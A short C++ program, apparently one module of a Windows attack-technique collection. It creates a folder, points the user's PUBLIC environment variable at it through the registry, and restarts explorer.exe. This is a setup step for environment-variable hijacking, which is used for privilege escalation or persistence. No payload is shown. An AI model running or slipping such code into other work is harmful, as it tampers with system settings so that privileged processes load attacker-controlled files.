#include <Windows.h>
#include "../../Utils/File.h"
#include "../../Utils/Registry.h"
#include "../../Utils/Process.h"

int main()
{
    mkDir("C:\\e");
    RegSetStr("Environment", "public", "C:\\e");

    killProc("explorer.exe");
    startProc("C:\\Windows\\explorer.exe");

    return 0;
}